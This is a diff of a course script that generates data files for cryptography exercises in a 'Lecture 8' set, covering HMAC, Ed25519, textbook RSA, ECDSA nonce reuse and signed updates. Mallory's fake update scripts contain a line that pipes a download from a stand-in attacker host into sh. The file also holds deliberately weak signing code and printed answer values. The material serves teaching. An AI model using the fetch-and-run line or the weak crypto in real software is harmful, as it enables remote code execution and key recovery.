@@ -1,263 +1,158 @@
-"""Makes every certificate, key and CRL that the Lecture 8 tasks ship (run once; the files are in git).
+"""Makes the data files of the Lecture 8 tasks and copies the ready modules into the task folders.
 
-    python3 make_files.py
+    cd Lecture8 && python3 checks/make_files.py
 
-Writes into ../TaskN/ and the same files into ../TaskN/solution/. Running it again makes NEW keys:
-then the pins in Task8, the values in Task6/handshake_ready.py and the outputs copied into the READMEs
-and the slides change, so run every solution again and update them.
-
-All keys are ECDSA P-256. "Trusty Root CA" and its issuing CA play a private test CA; Mallory has her own.
-Dates: the valid certificates start on 1 January 2025 or 1 November 2026 and end in 2028 or later,
-so the tasks work during the whole course; the "expired" ones ended in 2026.
+The keys are fixed: Ed25519 and ECDSA keys come from fixed labels, the RSA key is made once and then kept in
+checks/alice_rsa_private.pem. So a second run gives the same files. If you delete that PEM file, the RSA numbers
+change, and the README files, the slides and the lecturer's guide must be updated (Tasks 3, 4, 5, 7).
+At the end the script prints the constants that the starter files contain (Task 1, 8, 9).
 """
-import datetime
 import hashlib
+import hmac
 import os
 import shutil
 
-from cryptography import x509
 from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import ec
-from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
+from cryptography.hazmat.primitives.asymmetric import ec, rsa
+from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-ROOT = os.path.dirname(HERE)
+TOP = os.path.dirname(HERE)
 
 
-def d(y, m, day):
-    return datetime.datetime(y, m, day, 0, 0, 0)
+def path(*parts):
+    return os.path.join(TOP, *parts)
 
 
-def new_key():
-    return ec.generate_private_key(ec.SECP256R1())
+def write(rel, data):
+    if isinstance(data, str):
+        data = data.encode()
+    with open(path(rel), "wb") as f:
+        f.write(data)
 
 
-def name(cn, org=None):
-    parts = []
-    if org:
-        parts.append(x509.NameAttribute(NameOID.ORGANIZATION_NAME, org))
-    parts.append(x509.NameAttribute(NameOID.COMMON_NAME, cn))
-    return x509.Name(parts)
+def pem_private(key):
+    return key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
+                             serialization.NoEncryption())
 
 
-def cert(subject, subject_key, issuer, issuer_key, serial, start, end, ca=False, path_len=None,
-         dns=None, eku=None, issuer_pub=None):
-    """issuer_pub: the public key for the Authority Key Identifier (normally the issuer key's)."""
-    if issuer_pub is None:
-        issuer_pub = issuer_key.public_key()
-    b = x509.CertificateBuilder()
-    b = b.subject_name(subject).issuer_name(issuer).public_key(subject_key.public_key())
-    b = b.serial_number(serial).not_valid_before(start).not_valid_after(end)
-    b = b.add_extension(x509.BasicConstraints(ca=ca, path_length=path_len), critical=True)
-    if ca:
-        ku = x509.KeyUsage(digital_signature=True, content_commitment=False, key_encipherment=False,
-                           data_encipherment=False, key_agreement=False, key_cert_sign=True, crl_sign=True,
-                           encipher_only=False, decipher_only=False)
-    else:
-        ku = x509.KeyUsage(digital_signature=True, content_commitment=False, key_encipherment=False,
-                           data_encipherment=False, key_agreement=False, key_cert_sign=False, crl_sign=False,
-                           encipher_only=False, decipher_only=False)
-    b = b.add_extension(ku, critical=True)
-    if eku is not None:
-        b = b.add_extension(x509.ExtendedKeyUsage(eku), critical=False)
-    if dns is not None:
-        names = []
-        for n in dns:
-            names.append(x509.DNSName(n))
-        b = b.add_extension(x509.SubjectAlternativeName(names), critical=False)
-    b = b.add_extension(x509.SubjectKeyIdentifier.from_public_key(subject_key.public_key()), critical=False)
-    b = b.add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_pub), critical=False)
-    return b.sign(issuer_key, hashes.SHA256())
+def pem_public(key):
+    return key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
 
 
-def pem(c):
-    return c.public_bytes(serialization.Encoding.PEM)
+def label(text):
+    return hashlib.sha256(text.encode()).digest()
 
 
-def key_pem(k):
-    return k.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
-                           serialization.NoEncryption())
+def copy(module, task):
+    shutil.copy(os.path.join(HERE, module), path(task, module))
 
 
-def write(task, rel, data):
-    for base in (os.path.join(ROOT, task), os.path.join(ROOT, task, "solution")):
-        path = os.path.join(base, rel)
-        os.makedirs(os.path.dirname(path), exist_ok=True)
-        with open(path, "wb") as f:
-            f.write(data)
+# ---------- keys ----------
+alice_ed = Ed25519PrivateKey.from_private_bytes(label("lecture 8: Alice's Ed25519 key"))
+mallory_ed = Ed25519PrivateKey.from_private_bytes(label("lecture 8: Mallory's Ed25519 key"))
+P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
+alice_ec = ec.derive_private_key(int.from_bytes(label("lecture 8: Alice's ECDSA key"), "big") % P256_N,
+                                 ec.SECP256R1())
+rsa_path = os.path.join(HERE, "alice_rsa_private.pem")
+if not os.path.exists(rsa_path):
+    with open(rsa_path, "wb") as f:
+        f.write(pem_private(rsa.generate_private_key(public_exponent=65537, key_size=2048)))
+with open(rsa_path, "rb") as f:
+    alice_rsa = serialization.load_pem_private_key(f.read(), password=None)
+nums = alice_rsa.private_numbers()
+N, E, D = nums.public_numbers.n, nums.public_numbers.e, nums.d
 
+# ---------- Task 1: a download, a hash and a tag ----------
+alice_update = ("#!/bin/sh\n# Notes app, update 2.1, from Alice\n"
+                "cp notes-2.1 /usr/local/bin/notes\necho \"Notes updated to 2.1\"\n")
+mallory_update = ("#!/bin/sh\n# Notes app, update 2.1, from Alice\n"
+                  "cp notes-2.1 /usr/local/bin/notes\ncurl -s http://mallory.example/steal | sh\n"
+                  "echo \"Notes updated to 2.1\"\n")
+write("Task1/alice_update.sh", alice_update)
+write("Task1/mallory_update.sh", mallory_update)
+shared_key = label("lecture 8: the MAC key of Alice and Bob")
+t1_page_hash = hashlib.sha256(mallory_update.encode()).hexdigest()
+t1_alice_tag = hmac.new(shared_key, alice_update.encode(), "sha256").hexdigest()
 
-SERVER = [ExtendedKeyUsageOID.SERVER_AUTH]
-CLIENT = [ExtendedKeyUsageOID.CLIENT_AUTH]
+# ---------- Task 2: Ed25519 keys ----------
+write("Task2/alice_private.pem", pem_private(alice_ed))
+write("Task2/alice_public.pem", pem_public(alice_ed.public_key()))
+write("Task2/mallory_private.pem", pem_private(mallory_ed))
+copy("signing.py", "Task2")
 
-# ---------------------------------------------------------------- the Trusty CA (private test CA)
-root_key = new_key()
-root_name = name("Trusty Root CA", "Trusty CA")
-root = cert(root_name, root_key, root_name, root_key, 0x01, d(2025, 1, 1), d(2036, 1, 1), ca=True)
+# ---------- Task 3 and Task 5: Alice's RSA key ----------
+for t in ("Task3", "Task5"):
+    write(t + "/alice_rsa_private.pem", pem_private(alice_rsa))
+    copy("alice_key.py", t)
 
-int_key = new_key()
-int_name = name("Trusty Issuing CA 1", "Trusty CA")
-inter = cert(int_name, int_key, root_name, root_key, 0x0A01, d(2025, 1, 1), d(2031, 1, 1), ca=True, path_len=0)
+# ---------- Task 4: Alice's public key and two orders signed with textbook RSA ----------
+write("Task4/alice_rsa_public.pem", pem_public(alice_rsa.public_key()))
+orders = ""
+for amount in (20, 50):
+    orders += str(amount) + " " + format(pow(amount, D, N), "x") + "\n"
+write("Task4/orders.txt", orders)
+copy("bank_ready.py", "Task4")
 
-mal_key = new_key()
-mal_root_name = name("Mallory Root CA", "Mallory")
-mal_root = cert(mal_root_name, mal_key, mal_root_name, mal_key, 0x66, d(2025, 1, 1), d(2036, 1, 1), ca=True)
+# ---------- Task 5: a 100 000-byte update file ----------
+block = bytearray()
+counter = 0
+while len(block) < 100000:
+    block += hashlib.sha256(b"lecture 8: update.bin " + str(counter).encode()).digest()
+    counter += 1
+write("Task5/update.bin", bytes(block[:100000]))
+signed = ""
+for text in ("Pay Mallory 20 pounds. Alice", "Pay Mallory 50 pounds. Alice"):
+    h = int.from_bytes(hashlib.sha256(text.encode()).digest(), "big")
+    signed += format(pow(h, D, N), "x") + "\n"
+write("Task5/signed_orders.txt", signed)
 
-# ---------------------------------------------------------------- Task 1: six servers
-bob_key = new_key()
-good = cert(name("bob.example"), bob_key, int_name, int_key, 0x1001, d(2026, 11, 1), d(2028, 11, 1),
-            dns=["bob.example"], eku=SERVER)
-expired = cert(name("bob.example"), bob_key, int_name, int_key, 0x1000, d(2025, 10, 1), d(2026, 10, 1),
-               dns=["bob.example"], eku=SERVER)
-carol_key = new_key()
-wrong_name = cert(name("carol.example"), carol_key, int_name, int_key, 0x1002, d(2026, 11, 1), d(2028, 11, 1),
-                  dns=["carol.example"], eku=SERVER)
-mal_leaf_key = new_key()
-unknown_ca = cert(name("bob.example"), mal_leaf_key, mal_root_name, mal_key, 0x6601, d(2026, 11, 1),
-                  d(2028, 11, 1), dns=["bob.example"], eku=SERVER)
-self_key = new_key()
-self_signed = cert(name("bob.example"), self_key, name("bob.example"), self_key, 0x5E1F, d(2026, 11, 1),
-                   d(2028, 11, 1), dns=["bob.example"], eku=SERVER)
+# ---------- Task 7: three keys of Alice ----------
+write("Task7/alice_rsa_private.pem", pem_private(alice_rsa))
+write("Task7/alice_ecdsa_private.pem", pem_private(alice_ec))
+write("Task7/alice_ed25519_private.pem", pem_private(alice_ed))
+copy("schemes.py", "Task7")
 
-write("Task1", "certs/root.pem", pem(root))
-write("Task1", "certs/good.pem", pem(good) + pem(inter))
-write("Task1", "certs/good.key", key_pem(bob_key))
-write("Task1", "certs/expired.pem", pem(expired) + pem(inter))
-write("Task1", "certs/expired.key", key_pem(bob_key))
-write("Task1", "certs/wrong_name.pem", pem(wrong_name) + pem(inter))
-write("Task1", "certs/wrong_name.key", key_pem(carol_key))
-write("Task1", "certs/unknown_ca.pem", pem(unknown_ca))
-write("Task1", "certs/unknown_ca.key", key_pem(mal_leaf_key))
-write("Task1", "certs/self_signed.pem", pem(self_signed))
-write("Task1", "certs/self_signed.key", key_pem(self_key))
-write("Task1", "certs/no_intermediate.pem", pem(good))
-write("Task1", "certs/no_intermediate.key", key_pem(bob_key))
+# ---------- Task 8: two console programs signed with the same k ----------
+import sys
+sys.path.insert(0, path("Task8"))
+import ecdsa_ready as E8
+console_d = int.from_bytes(label("lecture 8: Alice's console signing key"), "big") % E8.q
+console_k = int.from_bytes(label("lecture 8: the k that never changes"), "big") % E8.q
+game_1 = "GAME 1\nTitle: Space Racer\nVersion: 1.0\nPublisher: Alice Games\n"
+game_2 = "GAME 2\nTitle: Garden Builder\nVersion: 2.3\nPublisher: Alice Games\n"
+mallory_game = "GAME 3\nTitle: Mallory's Loader\nVersion: 0.1\nRuns any program on the console.\n"
+write("Task8/game_1.txt", game_1)
+write("Task8/game_2.txt", game_2)
+write("Task8/mallory_game.txt", mallory_game)
+r1, s1 = E8.sign_with_k(console_d, game_1.encode(), console_k)
+r2, s2 = E8.sign_with_k(console_d, game_2.encode(), console_k)
+Q = E8.public_key(console_d)
+assert E8.verify(Q, game_1.encode(), r1, s1) and E8.verify(Q, game_2.encode(), r2, s2)
 
-# ---------------------------------------------------------------- Task 3: six chains, each breaks one check
-# case 1: a good chain
-write("Task3", "chains/root.pem", pem(root))
-write("Task3", "chains/case1.pem", pem(good) + pem(inter))
-# case 2: the intermediate has expired (the leaf is still valid)
-int0_key = new_key()
-int0_name = name("Trusty Issuing CA 0", "Trusty CA")
-inter0 = cert(int0_name, int0_key, root_name, root_key, 0x0A00, d(2024, 1, 1), d(2026, 6, 30), ca=True, path_len=0)
-leaf2 = cert(name("bob.example"), bob_key, int0_name, int0_key, 0x0F01, d(2026, 3, 1), d(2028, 3, 1),
-             dns=["bob.example"], eku=SERVER)
-write("Task3", "chains/case2.pem", pem(leaf2) + pem(inter0))
-# case 3: a wildcard that does not cover the bare name
-leaf3 = cert(name("*.bob.example"), bob_key, int_name, int_key, 0x1003, d(2026, 11, 1), d(2028, 11, 1),
-             dns=["*.bob.example"], eku=SERVER)
-write("Task3", "chains/case3.pem", pem(leaf3) + pem(inter))
-# case 4: Mallory's own leaf (CA:FALSE) signs a certificate for bob.example
-mleaf_key = new_key()
-mleaf_name = name("mallory.example")
-mleaf = cert(mleaf_name, mleaf_key, int_name, int_key, 0x1004, d(2026, 11, 1), d(2028, 11, 1),
-             dns=["mallory.example"], eku=SERVER)
-fake_bob_key = new_key()
-fake_bob = cert(name("bob.example"), fake_bob_key, mleaf_name, mleaf_key, 0x7777, d(2026, 11, 1), d(2028, 11, 1),
-                dns=["bob.example"], eku=SERVER)
-write("Task3", "chains/case4.pem", pem(fake_bob) + pem(mleaf) + pem(inter))
-# case 5: Mallory makes her own "Trusty Issuing CA 1": the same name, her key
-fake_int = cert(int_name, mal_key, root_name, mal_key, 0x0A01, d(2025, 1, 1), d(2031, 1, 1), ca=True, path_len=0,
-                issuer_pub=root_key.public_key())
-leaf5 = cert(name("bob.example"), fake_bob_key, int_name, mal_key, 0x1005, d(2026, 11, 1), d(2028, 11, 1),
-             dns=["bob.example"], eku=SERVER, issuer_pub=mal_key.public_key())
-write("Task3", "chains/case5.pem", pem(leaf5) + pem(fake_int))
-# case 6: a client certificate (clientAuth only) on a server
-leaf6 = cert(name("bob.example"), bob_key, int_name, int_key, 0x1006, d(2026, 11, 1), d(2028, 11, 1),
-             dns=["bob.example"], eku=CLIENT)
-write("Task3", "chains/case6.pem", pem(leaf6) + pem(inter))
+# ---------- Task 9: two update servers ----------
+for d in ("Task9/alice_server", "Task9/mallory_server"):
+    os.makedirs(path(d), exist_ok=True)
+t9_alice = "#!/bin/sh\n# Notes app, update 3.0, from Alice\ncp notes-3.0 /usr/local/bin/notes\n"
+t9_mallory = ("#!/bin/sh\n# Notes app, update 3.0, from Alice\ncp notes-3.0 /usr/local/bin/notes\n"
+              "curl -s http://mallory.example/steal | sh\n")
+write("Task9/alice_server/update.sh", t9_alice)
+write("Task9/alice_server/update.sig", alice_ed.sign(t9_alice.encode()))
+write("Task9/alice_server/public_key.pem", pem_public(alice_ed.public_key()))
+write("Task9/mallory_server/update.sh", t9_mallory)
+write("Task9/mallory_server/update.sig", mallory_ed.sign(t9_mallory.encode()))
+write("Task9/mallory_server/public_key.pem", pem_public(mallory_ed.public_key()))
+copy("signing.py", "Task9")
+alice_ed_hex = alice_ed.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw).hex()
 
-# ---------------------------------------------------------------- Task 4: a CRL
-bob4 = good
-carol4_key = new_key()
-carol4 = cert(name("carol.example"), carol4_key, int_name, int_key, 0x1002, d(2026, 11, 1), d(2028, 11, 1),
-              dns=["carol.example"], eku=SERVER)
-
-
-def crl(issuer_key, last, nxt, revoked):
-    b = x509.CertificateRevocationListBuilder().issuer_name(int_name).last_update(last).next_update(nxt)
-    for serial, when, reason in revoked:
-        r = x509.RevokedCertificateBuilder().serial_number(serial).revocation_date(when)
-        r = r.add_extension(x509.CRLReason(reason), critical=False)
-        b = b.add_revoked_certificate(r.build())
-    b = b.add_extension(x509.CRLNumber(len(revoked) + 40), critical=False)
-    return b.sign(issuer_key, hashes.SHA256())
-
-
-revoked = [(0x0FFE, d(2026, 9, 2), x509.ReasonFlags.superseded),
-           (0x1002, datetime.datetime(2026, 11, 10, 9, 30), x509.ReasonFlags.key_compromise)]
-good_crl = crl(int_key, d(2026, 11, 15), d(2027, 12, 31), revoked)
-old_crl = crl(int_key, d(2026, 10, 1), d(2026, 10, 8), revoked[:1])
-fake_crl = crl(mal_key, d(2026, 11, 15), d(2027, 12, 31), revoked[:1])
-write("Task4", "files/issuing_ca.pem", pem(inter))
-write("Task4", "files/bob.pem", pem(bob4))
-write("Task4", "files/carol.pem", pem(carol4))
-write("Task4", "files/crl.pem", good_crl.public_bytes(serialization.Encoding.PEM))
-write("Task4", "files/old_crl.pem", old_crl.public_bytes(serialization.Encoding.PEM))
-write("Task4", "files/fake_crl.pem", fake_crl.public_bytes(serialization.Encoding.PEM))
-
-# ---------------------------------------------------------------- Task 5: OCSP
-write("Task5", "files/issuing_ca.pem", pem(inter))
-write("Task5", "files/issuing_ca.key", key_pem(int_key))
-write("Task5", "files/bob.pem", pem(bob4))
-write("Task5", "files/carol.pem", pem(carol4))
-
-# ---------------------------------------------------------------- Task 6: CertificateVerify
-mal6_key = new_key()
-today_hash = hashlib.sha256(b"ClientHello ServerHello EncryptedExtensions Certificate, today").digest()
-old_hash = hashlib.sha256(b"ClientHello ServerHello EncryptedExtensions Certificate, yesterday").digest()
-
-
-def content(h):
-    return b" " * 64 + b"TLS 1.3, server CertificateVerify" + b"\x00" + h
-
-
-sig_bob_today = bob_key.sign(content(today_hash), ec.ECDSA(hashes.SHA256()))
-sig_mallory = mal6_key.sign(content(today_hash), ec.ECDSA(hashes.SHA256()))
-sig_bob_old = bob_key.sign(content(old_hash), ec.ECDSA(hashes.SHA256()))
-write("Task6", "files/bob.pem", pem(good))
-vals = ("# Made by Lecture8/checks/make_files.py\n"
-        "TODAY_HASH = '%s'\nOLD_HASH = '%s'\nSIG_BOB_TODAY = '%s'\nSIG_MALLORY = '%s'\nSIG_BOB_OLD = '%s'\n"
-        % (today_hash.hex(), old_hash.hex(), sig_bob_today.hex(), sig_mallory.hex(), sig_bob_old.hex()))
-write("Task6", "files/values.py", vals.encode())
-
-# ---------------------------------------------------------------- Task 7: mutual TLS
-staff_key = new_key()
-staff_name = name("Bob Staff CA", "Bob Ltd")
-staff = cert(staff_name, staff_key, staff_name, staff_key, 0x5A, d(2025, 1, 1), d(2036, 1, 1), ca=True)
-alice_key = new_key()
-alice = cert(name("Alice"), alice_key, staff_name, staff_key, 0x5A01, d(2026, 11, 1), d(2028, 11, 1), eku=CLIENT)
-mal7_key = new_key()
-mal7 = cert(name("Alice"), mal7_key, name("Alice"), mal7_key, 0x5A02, d(2026, 11, 1), d(2028, 11, 1), eku=CLIENT)
-write("Task7", "certs/server_root.pem", pem(root))
-write("Task7", "certs/server.pem", pem(good) + pem(inter))
-write("Task7", "certs/server.key", key_pem(bob_key))
-write("Task7", "certs/staff_ca.pem", pem(staff))
-write("Task7", "certs/alice.pem", pem(alice))
-write("Task7", "certs/alice.key", key_pem(alice_key))
-write("Task7", "certs/mallory.pem", pem(mal7))
-write("Task7", "certs/mallory.key", key_pem(mal7_key))
-
-# ---------------------------------------------------------------- Task 8: pinning
-api_name = name("api.bob.example")
-k1 = new_key()
-k2 = new_key()
-k3 = new_key()
-api_2026 = cert(api_name, k1, int_name, int_key, 0x2026, d(2026, 1, 10), d(2027, 1, 10), dns=["api.bob.example"],
-                eku=SERVER)
-api_same = cert(api_name, k1, int_name, int_key, 0x2027, d(2026, 12, 20), d(2027, 12, 20), dns=["api.bob.example"],
-                eku=SERVER)
-api_new = cert(api_name, k2, int_name, int_key, 0x2028, d(2026, 12, 20), d(2027, 12, 20), dns=["api.bob.example"],
-               eku=SERVER)
-api_backup = cert(api_name, k3, int_name, int_key, 0x2029, d(2026, 12, 20), d(2027, 12, 20),
-                  dns=["api.bob.example"], eku=SERVER)
-write("Task8", "certs/api_2026.pem", pem(api_2026))
-write("Task8", "certs/api_2027_same_key.pem", pem(api_same))
-write("Task8", "certs/api_2027_new_key.pem", pem(api_new))
-write("Task8", "certs/api_2027_backup_key.pem", pem(api_backup))
-backup_spki = k3.public_key().public_bytes(serialization.Encoding.DER,
-                                          serialization.PublicFormat.SubjectPublicKeyInfo)
-import base64
-print("Task 8 backup pin:", base64.b64encode(hashlib.sha256(backup_spki).digest()).decode())
-print("done")
+print("Task 1: PAGE_HASH =", t1_page_hash)
+print("Task 1: SHARED_KEY =", shared_key.hex())
+print("Task 1: ALICE_TAG =", t1_alice_tag)
+print("Task 8: Q =", hex(Q[0]), hex(Q[1]))
+print("Task 8: r1 == r2:", r1 == r2, " r =", hex(r1))
+print("Task 8: s1 =", hex(s1))
+print("Task 8: s2 =", hex(s2))
+print("Task 8: d (the answer) =", hex(console_d))
+print("Task 8: k (the answer) =", hex(console_k))
+print("Task 9: ALICE_KEY_HEX =", alice_ed_hex)
+print("RSA: n =", format(N, "x")[:12], "...", format(N, "x")[-12:], " e =", E)
